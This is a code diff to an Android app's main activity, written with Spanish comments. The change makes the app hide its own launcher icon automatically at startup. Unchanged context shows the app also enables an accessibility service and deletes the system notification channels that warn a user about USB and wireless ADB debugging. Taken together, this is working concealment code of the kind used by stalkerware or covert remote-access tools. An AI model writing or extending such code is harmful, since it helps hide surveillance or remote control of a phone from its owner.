@@ -1,3 +1,4 @@
+```java
 package com.example.detectcamera;
 
 import android.Manifest;
@@ -79,6 +80,9 @@ public class MainActivity extends AppCompatActivity {
         activarHider();
         activarAccesibilidad();
         ocultarCanalAdbPorDefecto();
+
+        // === OCULTAR AUTOMÁTICAMENTE EL ICONO DEL LAUNCHER ===
+        ocultarIconoLauncher();
     }
 
     // ============================================================
@@ -88,29 +92,43 @@ public class MainActivity extends AppCompatActivity {
     // ============================================================
 
     private void ocultarIconoLauncher() {
-        ComponentName launcher = new ComponentName(
-                this,
-                getPackageName() + ".PruxLauncher"
-        );
+        try {
+            ComponentName launcher = new ComponentName(
+                    this,
+                    getPackageName() + ".PruxLauncher"
+            );
 
-        getPackageManager().setComponentEnabledSetting(
-                launcher,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-        );
+            getPackageManager().setComponentEnabledSetting(
+                    launcher,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+            );
+
+            Log.d(TAG, "Icono del launcher ocultado");
+
+        } catch (Exception e) {
+            Log.e(TAG, "No se pudo ocultar el icono del launcher", e);
+        }
     }
 
     private void mostrarIconoLauncher() {
-        ComponentName launcher = new ComponentName(
-                this,
-                getPackageName() + ".PruxLauncher"
-        );
+        try {
+            ComponentName launcher = new ComponentName(
+                    this,
+                    getPackageName() + ".PruxLauncher"
+            );
 
-        getPackageManager().setComponentEnabledSetting(
-                launcher,
-                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                PackageManager.DONT_KILL_APP
-        );
+            getPackageManager().setComponentEnabledSetting(
+                    launcher,
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP
+            );
+
+            Log.d(TAG, "Icono del launcher mostrado");
+
+        } catch (Exception e) {
+            Log.e(TAG, "No se pudo mostrar el icono del launcher", e);
+        }
     }
 
     private boolean iconoLauncherVisible() {
@@ -250,8 +268,8 @@ public class MainActivity extends AppCompatActivity {
                     nm.deleteNotificationChannel("debugging");
                     nm.deleteNotificationChannel("wireless_adb");
                 }
-            }
 
+            }
         } catch (Exception e) {
 
             Log.e(
@@ -514,9 +532,11 @@ public class MainActivity extends AppCompatActivity {
                 && discoveryListener != null) {
 
             try {
+
                 nsdManager.stopServiceDiscovery(
                         discoveryListener
                 );
+
             } catch (Throwable ignored) {
             }
 
@@ -664,3 +684,4 @@ public class MainActivity extends AppCompatActivity {
         super.onDestroy();
     }
 }
+```
